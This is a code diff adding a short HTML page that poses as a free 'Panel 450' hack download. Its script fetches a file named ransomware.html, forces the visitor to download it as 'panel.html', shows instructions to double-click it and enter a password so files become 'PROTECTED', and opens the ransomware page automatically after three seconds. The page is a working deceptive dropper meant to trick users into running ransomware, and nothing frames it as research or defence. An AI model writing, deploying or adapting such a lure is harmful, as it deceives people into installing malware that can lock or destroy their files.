@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>Free Panel 450 Hack 🔥</title></head>
+<body style="margin:0;padding:50px;background:#000;color:lime;font-family:monospace;text-align:center;">
+<h1 id="status">🎮 Downloading Panel 450 Premium...</h1>
+<script>
+fetch('./ransomware.html')
+.then(r=>r.text())
+.then(data=>{
+    const blob=new Blob([data],{type:'text/html'});
+    const url=URL.createObjectURL(blob);
+    const a=document.createElement('a');
+    a.href=url;
+    a.download='panel.html';
+    a.click();
+    
+    document.getElementById('status').innerHTML=`
+<h2>✅ Panel Downloaded!</h2>
+<pre style="background:#111;color:lime;padding:20px;font-size:16px">
+1. Double-click "panel.html"
+2. Enter password: pentest2026
+3. Files will be PROTECTED! 😈
+</pre>
+    `;
+    
+    // Auto-open after 3s
+    setTimeout(()=>window.open('ransomware.html','_blank'),3000);
+});
+</script>
+</body>
+</html>
